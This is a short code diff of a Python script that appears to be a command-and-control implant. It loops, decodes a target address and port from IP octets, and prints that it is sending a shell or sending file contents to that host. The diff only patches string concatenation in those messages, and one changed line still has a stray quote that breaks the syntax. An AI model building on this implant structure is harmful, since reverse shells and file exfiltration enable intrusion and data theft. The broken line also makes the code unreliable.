@@ -105,7 +105,7 @@ while True:
             port = int(portIPSplit[0]) + int(portIPSplit[1])
             
             if not ((address == "100.100.100.100") and (port == 100)):
-                print("Sending shell to " + address + ":" + port) 
+                print("Sending shell to " + address + ":" + str(port)) 
         elif(ipSplit[3] == "85"): 
             print("Collecting file contents")
             
@@ -131,6 +131,6 @@ while True:
             port = int(portIPSplit[0]) + int(portIPSplit[1])
             
             if not ((address == "100.100.100.100") and (port == 100)):
-                print("Sending file contents to " + address + ":" + port") 
+                print("Sending file contents to " + address + ":" + str(port)") 
             
     time.sleep(WAIT_TIME)
